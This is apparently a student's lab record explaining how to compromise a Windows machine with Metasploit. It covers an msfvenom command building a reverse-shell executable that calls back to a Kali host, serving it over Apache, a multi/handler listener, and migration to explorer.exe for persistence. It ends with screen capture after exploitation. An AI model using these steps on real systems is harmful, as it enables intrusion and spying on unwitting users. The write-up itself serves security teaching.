# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
```
NAME: SANTHOSH S
REG.NO: 212224100052
```

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1771" height="956" alt="Screenshot From 2026-02-13 10-50-10" src="https://github.com/user-attachments/assets/b6b6fe20-4064-4714-b55a-949f67d564e3" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1772" height="346" alt="Screenshot From 2026-02-13 10-51-45" src="https://github.com/user-attachments/assets/ada5b987-7523-4b58-aeda-88d94a993423" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="637" height="93" alt="Screenshot From 2026-02-13 10-54-05" src="https://github.com/user-attachments/assets/cd3f07dd-e1d3-4bfe-acd4-7f4499fff931" />


Start apache server
sudo systemctl start apache2
## OUTPUT:
<img width="637" height="93" alt="Screenshot From 2026-02-13 10-54-43" src="https://github.com/user-attachments/assets/f34a36f6-3ff9-4c77-9583-26bcb5d4c193" />


Check the status of apache2
## OUTPUT:
<img width="1466" height="870" alt="Screenshot From 2026-02-13 10-56-08" src="https://github.com/user-attachments/assets/c0925503-a901-4bea-8ce5-c11f17823ea6" />



Invoke msfconsole:
## OUTPUT:
<img width="1466" height="848" alt="Screenshot From 2026-02-13 10-56-57" src="https://github.com/user-attachments/assets/67ab803a-ceae-4871-a1b4-adfdbda36a9f" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="1830" height="867" alt="Screenshot From 2026-02-13 10-57-39" src="https://github.com/user-attachments/assets/cbe0c76a-fe1b-4156-95dc-59c7f3e9e5fe" />




Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1022" height="268" alt="Screenshot From 2026-02-14 13-16-22" src="https://github.com/user-attachments/assets/734a60bd-4f1c-49ca-b13d-19aefa22bb88" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="1919" height="612" alt="Screenshot 2026-02-14 131845" src="https://github.com/user-attachments/assets/605a5c7b-b7c7-4a41-a5cc-399a86d2da0d" />

<img width="840" height="113" alt="Screenshot 2026-02-14 131904" src="https://github.com/user-attachments/assets/13ef0aec-3fe2-4bf1-b00b-6e8cc17fb50e" />

Bypass any warning boxes, double-click the file, and allow it to run.


On kali/parrot give the command exploit
## OUTPUT:



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="1385" height="347" alt="Screenshot From 2026-02-14 13-18-07" src="https://github.com/user-attachments/assets/2125613f-36d7-48c6-a2e8-7ef803a46c33" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="657" height="123" alt="Screenshot From 2026-02-14 13-21-26" src="https://github.com/user-attachments/assets/b561e497-607c-4ac6-80e5-7aa1ed6057b3" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="1830" height="933" alt="Screenshot From 2026-02-14 13-22-13" src="https://github.com/user-attachments/assets/8a01fa75-d423-45bc-9ea9-04e2165b9336" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
Screenshare shows the targeted windows screen
## OUTPUT:
<img width="592" height="75" alt="Screenshot From 2026-02-14 13-23-29" src="https://github.com/user-attachments/assets/d41d253d-1435-4556-b1bb-fabb6463c6db" />

<img width="1920" height="1102" alt="Screenshot From 2026-02-14 13-30-26" src="https://github.com/user-attachments/assets/68e9ae15-e244-4de0-a2d4-37bffce4ce3e" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

